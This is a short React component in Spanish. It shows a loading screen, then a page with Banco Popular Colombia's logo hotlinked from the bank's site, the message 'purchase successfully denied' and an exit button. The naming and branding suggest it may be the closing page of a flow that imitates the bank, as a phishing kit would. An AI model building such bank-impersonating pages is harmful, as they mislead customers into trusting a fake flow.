import React, { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import Cargando from './Cargando'

const UltimaPag = () => {

  const navigate = useNavigate()
  const [load, setLoad] = useState(true)

  setTimeout(() => {
    setLoad(false)
  }, 2000);

  const salir = () => {
    navigate('/')
  }

  if(load){
    return <Cargando />
  }else {
    return (
      <div className='contraseña ultima-pag'>
        <section>
  
        <div className="texto-contraseña">
              <div className="img-contra">
                <img src="https://www.bancopopular.com.co/wps/wcm/connect/bancopopular/8c577fab-2c66-47be-922b-65f8340f17f5/tc-entidad-ico.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_M84C1K82N8V660QOF3GM0O0003-8c577fab-2c66-47be-922b-65f8340f17f5-nLHy9.R" alt="" />
              </div>
              <h1>Compra negada exitosamente</h1>
            </div>
  
            <button onClick={salir} className="aprobar">Salir</button>
  
        </section>
      </div>
    )
  }
}

export default UltimaPag